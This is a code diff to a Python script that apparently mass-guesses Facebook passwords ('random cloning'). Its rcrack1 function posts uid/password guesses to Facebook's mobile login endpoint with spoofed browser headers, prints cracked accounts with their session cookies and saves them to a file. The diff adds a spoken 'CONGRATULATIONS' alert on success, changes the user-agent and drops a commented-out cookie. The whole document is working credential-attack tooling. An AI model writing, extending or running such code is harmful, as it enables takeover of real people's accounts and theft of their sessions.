@@ -417,7 +417,7 @@ def num():
 
         print(logo)
 
-        os.system('espeak -a 200 "Random cloning Started RED , RED , RED"')
+        os.system('espeak -a 200 "Random , RED , RED , RED"')
 
         tl = str(len(user))
 
@@ -496,8 +496,7 @@ def rcrack1(uid,pwx,tl):
             "scheme": 'https',
          'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
-           'cache-control': 'max-age=0',
-           # 'cookie': 'sb=Xq4iZonTrfV_leYf6nPacQet; datr=Xq4iZu2ozZ19Gkb2TVJOaDkd; ps_n=1; ps_l=1; locale=en_US; dpr=3.752533197402954; m_pixel_ratio=3.752533197402954; wd=685x1257; fr=0xfDlbIj9EYumAA8K.AWXbnHwPpZUfTWc3Q8Ros6mz30U.BmIq5e..AAA.0.0.BmIrck.AWVYVZ9_Buo',
+           'cache-control': 'max-age=0',           
            'dpr': '2.625',
            'referer': 'https://m.alpha.facebook.com/?paipv=0&eav=AfZ8Gp34Q1hL9klLOrSSdcyZKQ9k5nW5LGDgloRLAZ_6_E1XQIZjYtjVxbYJOemRuxM&_rdc=1&_rdr',
            'sec-ch-prefers-color-scheme': 'dark',
@@ -512,7 +511,7 @@ def rcrack1(uid,pwx,tl):
            'sec-fetch-site': 'same-origin',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
-           'user-agent': 'Mozilla/5.0 (X11; U; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6261.204 Safari/537.36',
+           'user-agent': 'pro',
            'viewport-width': '980',}
             lo = session.post('https://m.alpha.facebook.com/login/device-based/regular/login/?refsrc',data=log_data,headers=header_freefb).text
 
@@ -526,7 +525,9 @@ def rcrack1(uid,pwx,tl):
 
                 print(f"\033[38;5;46m[🆗🟢] {uid} | {ps}")
 
-                print(f" Cookie : {coki} = \033[1;34m'+RED'  \033[0;97m")
+                os.system('espeak -a 200 "CONGRATULATIONS"')
+                
+                print(f" Cookie : {coki} =\033[0;97m")
 
                 open('/sdcard/RED.txt', 'a').write(uid+' | '+ps+'\n')
 
